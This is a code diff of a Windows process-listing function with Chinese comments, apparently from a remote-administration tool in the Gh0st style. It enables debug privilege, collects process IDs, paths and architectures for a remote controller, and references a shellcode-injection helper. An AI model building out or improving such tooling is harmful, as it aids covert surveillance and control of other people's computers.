@@ -56,72 +56,83 @@ void CSystemManager::SendWindowsList()
 
 LPBYTE CSystemManager::GetProcessList()
 {
-    DebugPrivilege(SE_DEBUG_NAME,TRUE);     //提取权限
-
-    HANDLE          hProcess  = NULL;
-    HANDLE			hSnapshot = NULL;
-    PROCESSENTRY32	pe32 = {0};
+    DebugPrivilege(SE_DEBUG_NAME, TRUE);     //提取权限
+    HANDLE          hProcess = NULL;
+    HANDLE          hSnapshot = NULL;
+    PROCESSENTRY32  pe32 = { 0 };
     pe32.dwSize = sizeof(PROCESSENTRY32);
-    char			szProcessFullPath[MAX_PATH] = {0};
-    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
-
+    char            szProcessFullPath[MAX_PATH] = { 0 };
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     DWORD           dwOffset = 0;
     DWORD           dwLength = 0;
-    DWORD			cbNeeded = 0;
-    HMODULE			hModules = NULL;   //进程中第一个模块的句柄
-
+    DWORD           cbNeeded = 0;
+    HMODULE         hModules = NULL;   //进程中第一个模块的句柄
     LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //暂时分配一下缓冲区
     if (szBuffer == NULL)
         return NULL;
     szBuffer[0] = TOKEN_PSLIST;                      //注意这个是数据头
     dwOffset = 1;
-
-    if(Process32First(hSnapshot, &pe32)) {           //得到第一个进程顺便判断一下系统快照是否成功
+    if (Process32First(hSnapshot, &pe32)) {           //得到第一个进程顺便判断一下系统快照是否成功
         do {
+            memset(szProcessFullPath, 0, sizeof(szProcessFullPath));  // 清空路径缓冲区
+
             //打开进程并返回句柄
             hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
-                                   FALSE, pe32.th32ProcessID);   //打开目标进程
-            {
-                //枚举第一个模块句柄也就是当前进程完整路径
-                EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
-                //得到自身的完整名称
-                DWORD dwReturn = GetModuleFileNameEx(hProcess, hModules,
-                                                     szProcessFullPath,
-                                                     sizeof(szProcessFullPath));
+                FALSE, pe32.th32ProcessID);   //打开目标进程
 
-                if (dwReturn==0) {
-                    strcpy(szProcessFullPath,"");
+            if (hProcess != NULL) {
+                // 优先使用 QueryFullProcessImageName（不受32/64位限制）
+                DWORD dwSize = MAX_PATH;
+                if (!QueryFullProcessImageNameA(hProcess, 0, szProcessFullPath, &dwSize)) {
+                    // 回退到原来的方法
+                    EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
+                    DWORD dwReturn = GetModuleFileNameExA(hProcess, hModules,
+                        szProcessFullPath,
+                        sizeof(szProcessFullPath));
+                    if (dwReturn == 0) {
+                        strcpy(szProcessFullPath, pe32.szExeFile);  // 最后用进程名
+                    }
                 }
-                BOOL is64Bit;
-                ShellcodeInj::IsProcess64Bit(hProcess, is64Bit);
-                const char* arch = is64Bit ? "x64" : "x86";
-                char exeFile[300];
-                sprintf(exeFile, "%s:%s", pe32.szExeFile, arch);
-                //开始计算占用的缓冲区， 我们关心他的发送的数据结构
-                // 此进程占用数据大小
-                dwLength = sizeof(DWORD) +
-                           lstrlen(exeFile) + lstrlen(szProcessFullPath) + 2;
-                // 缓冲区太小，再重新分配下
-                if (LocalSize(szBuffer) < (dwOffset + dwLength))
-                    szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
-                                                    LMEM_ZEROINIT|LMEM_MOVEABLE);
-
-                //接下来三个memcpy就是向缓冲区里存放数据 数据结构是
-                //进程ID+进程名+0+进程完整名+0  进程
-                //因为字符数据是以0 结尾的
-                memcpy(szBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
-                dwOffset += sizeof(DWORD);
-
-                memcpy(szBuffer + dwOffset, exeFile, lstrlen(exeFile) + 1);
-                dwOffset += lstrlen(exeFile) + 1;
-
-                memcpy(szBuffer + dwOffset, szProcessFullPath, lstrlen(szProcessFullPath) + 1);
-                dwOffset += lstrlen(szProcessFullPath) + 1;
+                CloseHandle(hProcess);  // 关闭进程句柄，防止泄漏
             }
-        } while(Process32Next(hSnapshot, &pe32));    //继续得到下一个快照
-    }
+            else {
+                // OpenProcess 失败，使用快照中的进程名
+                strcpy(szProcessFullPath, pe32.szExeFile);
+            }
 
-    DebugPrivilege(SE_DEBUG_NAME,FALSE);  //还原提权
+            BOOL is64Bit = FALSE;
+            // 重新打开进程检测位数（因为上面已关闭）
+            hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
+            if (hProcess != NULL) {
+                ShellcodeInj::IsProcess64Bit(hProcess, is64Bit);
+                CloseHandle(hProcess);
+            }
+
+            const char* arch = is64Bit ? "x64" : "x86";
+            char exeFile[300];
+            sprintf(exeFile, "%s:%s", pe32.szExeFile, arch);
+
+            //开始计算占用的缓冲区， 我们关心他的发送的数据结构
+            // 此进程占用数据大小
+            dwLength = sizeof(DWORD) +
+                lstrlen(exeFile) + lstrlen(szProcessFullPath) + 2;
+            // 缓冲区太小，再重新分配下
+            if (LocalSize(szBuffer) < (dwOffset + dwLength))
+                szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
+                    LMEM_ZEROINIT | LMEM_MOVEABLE);
+            //接下来三个memcpy就是向缓冲区里存放数据 数据结构是
+            //进程ID+进程名+0+进程完整名+0  进程
+            //因为字符数据是以0 结尾的
+            memcpy(szBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
+            dwOffset += sizeof(DWORD);
+            memcpy(szBuffer + dwOffset, exeFile, lstrlen(exeFile) + 1);
+            dwOffset += lstrlen(exeFile) + 1;
+            memcpy(szBuffer + dwOffset, szProcessFullPath, lstrlen(szProcessFullPath) + 1);
+            dwOffset += lstrlen(szProcessFullPath) + 1;
+
+        } while (Process32Next(hSnapshot, &pe32));    //继续得到下一个快照
+    }
+    DebugPrivilege(SE_DEBUG_NAME, FALSE);  //还原提权
     SAFE_CLOSE_HANDLE(hSnapshot);       //释放句柄
     return szBuffer;
 }
